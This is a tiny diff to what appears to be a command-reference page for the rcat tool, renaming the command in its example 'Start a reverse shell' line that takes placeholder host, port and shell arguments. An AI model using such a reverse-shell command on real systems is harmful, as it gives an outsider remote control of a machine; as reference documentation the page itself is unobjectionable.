@@ -10,4 +10,4 @@
 
 - Start a reverse shell:
 
-`rcat {{host}} {{port}} -r {{shell}}`
+`rc {{host}} {{port}} -r {{shell}}`
